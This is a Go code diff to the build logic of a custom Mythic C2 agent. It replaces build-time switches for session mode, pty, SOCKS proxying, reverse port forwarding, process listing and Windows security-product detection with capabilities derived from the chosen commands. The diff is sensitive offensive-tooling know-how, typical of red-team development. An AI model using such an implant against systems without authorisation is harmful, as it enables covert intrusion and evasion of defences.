@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"sort"
 	"strings"
 )
 
@@ -21,7 +22,7 @@ var payloadDefinition = agentstructs.PayloadType{
 	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
 	Wrapper:                                false,
 	CanBeWrappedByTheFollowingPayloadTypes: []string{},
-	SupportsDynamicLoading:                 false,
+	SupportsDynamicLoading:                 true,
 	Description:                            "最小可跑的 Go Agent 模板（用于 Mythic 二次开发）",
 	SupportedC2Profiles:                    []string{"http", "websocket", "masked_https"},
 	MythicEncryptsData:                     true,
@@ -34,55 +35,6 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  "amd64",
 			Choices:       []string{"amd64", "arm64"},
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
-		},
-		{
-			Name:          "enable_session_mode",
-			Description:   "是否启用 Beacon + Session 双模架构",
-			Required:      false,
-			DefaultValue:  true,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_interactive",
-			Description:   "是否编入 interactive/pty 能力",
-			Required:      false,
-			DefaultValue:  true,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_socks",
-			Description:   "是否编入 SOCKS 代理能力",
-			Required:      false,
-			DefaultValue:  false,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_rpfwd",
-			Description:   "是否编入反向端口转发能力",
-			Required:      false,
-			DefaultValue:  false,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_sysinfo",
-			Description:   "是否编入系统基础信息收集模块",
-			Required:      false,
-			DefaultValue:  true,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_process_list",
-			Description:   "是否编入进程枚举模块",
-			Required:      false,
-			DefaultValue:  true,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
-		},
-		{
-			Name:          "enable_avscan",
-			Description:   "是否编入基于进程名的安全产品识别模块（仅 Windows 有效）",
-			Required:      false,
-			DefaultValue:  true,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
 			Name:          "interactive_shell",
@@ -148,34 +100,6 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	if goarch == "" {
 		goarch = runtime.GOARCH
 	}
-	enableInteractive, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_interactive")
-	if err != nil {
-		enableInteractive = true
-	}
-	enableSessionMode, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_session_mode")
-	if err != nil {
-		enableSessionMode = true
-	}
-	enableSocks, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_socks")
-	if err != nil {
-		enableSocks = false
-	}
-	enableRpfwd, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_rpfwd")
-	if err != nil {
-		enableRpfwd = false
-	}
-	enableSysinfo, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_sysinfo")
-	if err != nil {
-		enableSysinfo = true
-	}
-	enableProcessList, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_process_list")
-	if err != nil {
-		enableProcessList = true
-	}
-	enableAVScan, err := payloadBuildMsg.BuildParameters.GetBooleanArg("enable_avscan")
-	if err != nil {
-		enableAVScan = true
-	}
 	interactiveShell, err := payloadBuildMsg.BuildParameters.GetStringArg("interactive_shell")
 	if err != nil {
 		interactiveShell = ""
@@ -184,7 +108,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	if err != nil {
 		insecureSkipVerify = false
 	}
-	commandList = filterCommandList(payloadBuildMsg.CommandList, goos, enableSessionMode, enableInteractive, enableSocks, enableRpfwd, enableSysinfo, enableProcessList, enableAVScan)
+	commandList = filterCommandList(payloadBuildMsg.CommandList, goos)
+	capabilities := deriveCapabilitiesFromCommandList(commandList, goos)
+	enableSessionMode := capabilities.sessionModeEnabled
 	response.UpdatedCommandList = &commandList
 
 	httpEmbedded := embeddedBuildProfile{}
@@ -240,12 +166,12 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		EnableSessionMode:  enableSessionMode,
 		PollInterval:       5,
 		Capabilities: embeddedBuildCapabilities{
-			InteractiveEnabled: enableInteractive,
-			SocksEnabled:       enableSocks,
-			RpfwdEnabled:       enableRpfwd,
-			SysinfoEnabled:     enableSysinfo,
-			ProcessListEnabled: enableProcessList,
-			AVScanEnabled:      enableAVScan && goos == "windows",
+			InteractiveEnabled: capabilities.interactiveEnabled,
+			SocksEnabled:       capabilities.socksEnabled,
+			RpfwdEnabled:       capabilities.rpfwdEnabled,
+			SysinfoEnabled:     capabilities.sysinfoEnabled,
+			ProcessListEnabled: capabilities.processListEnabled,
+			AVScanEnabled:      capabilities.avscanEnabled,
 			InteractiveShell:   interactiveShell,
 		},
 		Profiles: map[string]embeddedBuildProfile{
@@ -268,12 +194,12 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		"main.BuildCallbackPort":          httpEmbedded.CallbackPort,
 		"main.BuildAESPSK":                httpEmbedded.AESPSK,
 		"main.BuildEnableSessionMode":     fmt.Sprintf("%t", enableSessionMode),
-		"main.BuildEnableInteractive":     fmt.Sprintf("%t", enableInteractive),
-		"main.BuildEnableSocks":           fmt.Sprintf("%t", enableSocks),
-		"main.BuildEnableRpfwd":           fmt.Sprintf("%t", enableRpfwd),
-		"main.BuildEnableSysinfo":         fmt.Sprintf("%t", enableSysinfo),
-		"main.BuildEnableProcessList":     fmt.Sprintf("%t", enableProcessList),
-		"main.BuildEnableAVScan":          fmt.Sprintf("%t", enableAVScan && goos == "windows"),
+		"main.BuildEnableInteractive":     fmt.Sprintf("%t", capabilities.interactiveEnabled),
+		"main.BuildEnableSocks":           fmt.Sprintf("%t", capabilities.socksEnabled),
+		"main.BuildEnableRpfwd":           fmt.Sprintf("%t", capabilities.rpfwdEnabled),
+		"main.BuildEnableSysinfo":         fmt.Sprintf("%t", capabilities.sysinfoEnabled),
+		"main.BuildEnableProcessList":     fmt.Sprintf("%t", capabilities.processListEnabled),
+		"main.BuildEnableAVScan":          fmt.Sprintf("%t", capabilities.avscanEnabled),
 		"main.BuildInteractiveShell":      interactiveShell,
 		"main.BuildInsecureSkipVerify":    fmt.Sprintf("%t", insecureSkipVerify),
 		"main.BuildWebsocketCallbackHost": websocketEmbedded.CallbackHost,
@@ -295,7 +221,7 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		PayloadUUID: payloadBuildMsg.PayloadUUID,
 		StepName:    "Configure",
 		StepSuccess: true,
-		StepStdout:  fmt.Sprintf("GOOS=%s GOARCH=%s http=%s:%s websocket=%s:%s output=%s session_mode=%t interactive=%t socks=%t rpfwd=%t sysinfo=%t ps=%t avscan=%t shell=%s insecure_skip_verify=%t commands=%v", goos, goarch, httpEmbedded.CallbackHost, httpEmbedded.CallbackPort, websocketEmbedded.CallbackHost, websocketEmbedded.CallbackPort, outputPath, enableSessionMode, enableInteractive, enableSocks, enableRpfwd, enableSysinfo, enableProcessList, enableAVScan && goos == "windows", strings.TrimSpace(interactiveShell), insecureSkipVerify, commandList),
+		StepStdout:  fmt.Sprintf("GOOS=%s GOARCH=%s http=%s:%s websocket=%s:%s output=%s session_mode=%t interactive=%t socks=%t rpfwd=%t sysinfo=%t ps=%t avscan=%t shell=%s insecure_skip_verify=%t commands=%v", goos, goarch, httpEmbedded.CallbackHost, httpEmbedded.CallbackPort, websocketEmbedded.CallbackHost, websocketEmbedded.CallbackPort, outputPath, enableSessionMode, capabilities.interactiveEnabled, capabilities.socksEnabled, capabilities.rpfwdEnabled, capabilities.sysinfoEnabled, capabilities.processListEnabled, capabilities.avscanEnabled, strings.TrimSpace(interactiveShell), insecureSkipVerify, commandList),
 	})
 
 	cmd := exec.Command("go", args...)
@@ -369,36 +295,12 @@ func extractAESPSKValue(value interface{}) string {
 	return ""
 }
 
-func filterCommandList(input []string, goos string, enableSessionMode bool, enableInteractive bool, enableSocks bool, enableRpfwd bool, enableSysinfo bool, enableProcessList bool, enableAVScan bool) []string {
+func filterCommandList(input []string, goos string) []string {
 	filtered := make([]string, 0, len(input))
 	for _, command := range input {
 		switch command {
-		case "sysinfo":
-			if enableSysinfo {
-				filtered = append(filtered, command)
-			}
-		case "ps":
-			if enableProcessList {
-				filtered = append(filtered, command)
-			}
 		case "avscan":
-			if enableAVScan && goos == "windows" {
-				filtered = append(filtered, command)
-			}
-		case "pty":
-			if enableSessionMode && enableInteractive {
-				filtered = append(filtered, command)
-			}
-		case "socks", "socks_stop":
-			if enableSessionMode && enableSocks {
-				filtered = append(filtered, command)
-			}
-		case "rpfwd", "rpfwd_stop":
-			if enableSessionMode && enableRpfwd {
-				filtered = append(filtered, command)
-			}
-		case "session_start", "session_stop", "session_status":
-			if enableSessionMode {
+			if goos == "windows" {
 				filtered = append(filtered, command)
 			}
 		default:
@@ -406,6 +308,47 @@ func filterCommandList(input []string, goos string, enableSessionMode bool, enab
 		}
 	}
 	return filtered
+}
+
+type derivedCapabilities struct {
+	sessionModeEnabled bool
+	interactiveEnabled bool
+	socksEnabled       bool
+	rpfwdEnabled       bool
+	sysinfoEnabled     bool
+	processListEnabled bool
+	avscanEnabled      bool
+}
+
+// 根据 UI 中 “Select Commands to Include in the Payload” 的结果推导能力。
+// 这样代理、信息收集等模块是否编入 payload，完全由命令选择决定。
+func deriveCapabilitiesFromCommandList(commandList []string, goos string) derivedCapabilities {
+	commandSet := make(map[string]struct{}, len(commandList))
+	for _, command := range commandList {
+		commandSet[command] = struct{}{}
+	}
+	capabilities := derivedCapabilities{
+		interactiveEnabled: hasAnyCommand(commandSet, "pty"),
+		socksEnabled:       hasAnyCommand(commandSet, "socks", "socks_stop"),
+		rpfwdEnabled:       hasAnyCommand(commandSet, "rpfwd", "rpfwd_stop"),
+		sysinfoEnabled:     hasAnyCommand(commandSet, "sysinfo"),
+		processListEnabled: hasAnyCommand(commandSet, "ps"),
+		avscanEnabled:      goos == "windows" && hasAnyCommand(commandSet, "avscan"),
+	}
+	capabilities.sessionModeEnabled = hasAnyCommand(commandSet,
+		"session_start", "session_stop", "session_status",
+		"pty", "socks", "socks_stop", "rpfwd", "rpfwd_stop",
+	)
+	return capabilities
+}
+
+func hasAnyCommand(commandSet map[string]struct{}, names ...string) bool {
+	for _, name := range names {
+		if _, ok := commandSet[name]; ok {
+			return true
+		}
+	}
+	return false
 }
 
 func buildLdflags(values map[string]string) string {
@@ -444,6 +387,19 @@ func Initialize() {
 	agentstructs.AllPayloadData.Get("my_agent").AddPayloadDefinition(payloadDefinition)
 	agentstructs.AllPayloadData.Get("my_agent").AddBuildFunction(build)
 	agentstructs.AllPayloadData.Get("my_agent").AddOnNewCallbackFunction(onNewCallback)
+	logRegisteredCommands()
+}
+
+// logRegisteredCommands 启动时打印运行时实际注册到容器里的命令列表，
+// 方便定位“数据库里有命令，但容器运行时找不到命令”的问题。
+func logRegisteredCommands() {
+	commands := agentstructs.AllPayloadData.Get("my_agent").GetCommands()
+	names := make([]string, 0, len(commands))
+	for _, command := range commands {
+		names = append(names, command.Name)
+	}
+	sort.Strings(names)
+	fmt.Printf("[my_agent] 运行时注册命令: %s\n", strings.Join(names, ", "))
 }
 
 type embeddedBuildConfig struct {
